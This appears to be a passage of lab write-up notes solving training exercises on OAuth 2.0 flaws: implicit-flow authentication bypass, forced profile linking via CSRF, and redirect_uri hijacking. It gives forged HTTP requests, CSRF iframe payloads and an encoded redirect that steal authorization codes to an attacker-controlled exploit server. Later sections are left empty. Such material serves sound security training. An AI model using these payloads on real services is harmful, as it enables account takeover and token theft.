# OAuth 2.0 authentication vulnerabilities

### >> 1. Authentication bypass via OAuth implicit flow
> This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password. To solve the lab, log in to Carlos's account. His email address is carlos@carlos-montoya.net. You can log in with your own social media account using the following credentials: wiener:peter.`

Solution: 
- Change the payload to reflect the email address and username of Carlos
````http
POST /authenticate HTTP/1.1
Host: ac2e1fea1e94ca5bc1979089008c00ce.web-security-academy.net
Cookie: session=AYlXg9S3SS3Yb7OjYfXNTGl8gFqgRvdt
Content-Length: 111
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"
Accept: application/json
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Origin: https://ac2e1fea1e94ca5bc1979089008c00ce.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ac2e1fea1e94ca5bc1979089008c00ce.web-security-academy.net/oauth-callback
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"tY2Y8c57C6kHCy8X3BxnE4Hm3YoJyeOfMuhjlkFSQeb"}
````

### >> 2. Lab: Forced OAuth profile linking

>> This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts. To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete Carlos. The admin user will open anything you send from the exploit server and they always have an active session on the blog website. You can log in to your own accounts using the following credentials: Blog website account: wiener:peter Social media profile: peter.wiener:hotdog

- The request sends the authorization code to the /oauth-login `redirect_uri`
- There is no `state` parameter in the oauth, so it might be vulnerable to CSRF
````
https://oauth-ac4e1f2d1eaf72afc0ae569802f400e3.web-security-academy.net/auth?client_id=j2ba7uqsy1y35kw1wmd5o&redirect_uri=https://ac0b1f681ee77200c0b65677005800f5.web-security-academy.net/oauth-login&response_type=code&scope=openid%20profile%20email
````

- Run the first login complete and then click to attach a social profile again, but now with interception on on burp
- Drop this request and copy the URL; perform logout
- Create a iframe object and delivery it to the victm using the Exploit server
````html
<iframe src="https://ac0b1f681ee77200c0b65677005800f5.web-security-academy.net/oauth-linking?code=LTpkSauiz5Y_iiFdFkmU7jTvtADFySL_sOGqSWMgysp"></iframe>
````
- Click now in Login with Social Media and delete the Carlos user to complete the lab

### >> 3. Lab: OAuth account hijacking via redirect_uri

>> This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.  To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos. The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service. You can log in with your own social media account using the following credentials: wiener:peter.

- There is a redirect_url vulnerability where you can change the destination of the callback.

````http
GET /auth?client_id=ezdeqti0mlvmnntgt5fcu&redirect_uri=https://exploit-ac2b1fd61eca7273c0797dda01610022.web-security-academy.net&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-ac3a1f561e1b7240c0f97dcb023a00dd.web-security-academy.net
Cookie: _session=YqBOphL7KtRbtBcp4cgil; _session.legacy=YqBOphL7KtRbtBcp4cgil
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://acad1f4d1e6072bec0507d00006d00e4.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


````

- Insert a iframe object with the redirect_url changed

````html
<iframe src="https://oauth-ac3a1f561e1b7240c0f97dcb023a00dd.web-security-academy.net/auth?client_id=ezdeqti0mlvmnntgt5fcu&redirect_uri=https://exploit-ac2b1fd61eca7273c0797dda01610022.web-security-academy.net&response_type=code&scope=openid%20profile%20email"></iframe>
````

- The callback returns a code to the webserver (controlled by the attacker)

````apache
172.31.30.114   2022-05-06 17:36:28 +0000 "GET /?code=E-byTvzsUdz-fhc2hWBYqFs7mJiEf2OvWchcO2dEEVL HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
````

- Use the code in a new login session

````http
GET /oauth-callback?code=E-byTvzsUdz-fhc2hWBYqFs7mJiEf2OvWchcO2dEEVL HTTP/1.1
Host: acad1f4d1e6072bec0507d00006d00e4.web-security-academy.net
Cookie: session=FEmgoUPOnicODVY4VMMdZRbz8ozTJ570
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://acad1f4d1e6072bec0507d00006d00e4.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


````

- And delete the user Carlos to complete the exercise

### >> 4. Lab: Stealing OAuth access tokens via an open redirect

> This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application. To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.  Note: You cannot access the admin's API key by simply logging in to their account on the client application. The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service. You can log in via your own social media account using the following credentials: wiener:peter.

4.1 redirect_uri

````
GET /auth?client_id=q7trlt3x9g52oztmwth38&redirect_uri=https://acc51f911fc90fa2c0cf642f00de002a.web-security-academy.net/oauth-callback&response_type=token&nonce=1051619115&scope=openid%20profile%20email HTTP/1.1
````

- Encode as URL
````
/oauth-callback
%2f%6f%61%75%74%68%2d%63%61%6c%6c%62%61%63%6b
````

- 
````
GET /auth?client_id=q7trlt3x9g52oztmwth38&redirect_uri=https://acc51f911fc90fa2c0cf642f00de002a.web-security-academy.net%2f%6f%61%75%74%68%2d%63%61%6c%6c%62%61%63%6b@exploit-ac531ff11f6f0f8bc0d7645701760069.web-security-academy.net&response_type=token&nonce=1051619115&scope=openid%20profile%20email HTTP/1.1
````

4.2 steal token



### >> 5.
